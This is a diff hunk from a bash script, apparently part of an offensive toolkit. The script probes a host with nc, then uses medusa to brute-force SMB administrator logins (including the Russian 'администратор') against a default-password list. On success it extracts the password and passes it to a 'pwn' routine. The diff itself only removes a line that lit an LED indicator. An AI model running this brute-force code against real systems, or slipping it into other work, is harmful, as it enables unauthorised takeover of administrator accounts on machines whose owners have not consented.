@@ -37,7 +37,6 @@ if nc -nw $WAIT $1 $DPORT < /dev/null 2> /dev/null; then
 	for user in администратор administrator admin; do
 		found=$(medusa -M smbnt -m PASS:PASSWORD -h $1 -u $user -P on_client/bruteforce/default_pass_for_services_unhash.txt | grep 'SUCCESS (ADMIN$ - Access Allowed)')
 		if [ x"$found" != "x" ]; then
-			led red on 2> /dev/null
 			echo $found | grep 'SUCCESS' --color=auto
 			password=$(echo $found|sed -rn 's/.*Password: (.*) \[SUCCESS.*/\1/p')
 			pwn "$1" "$user" "$password"
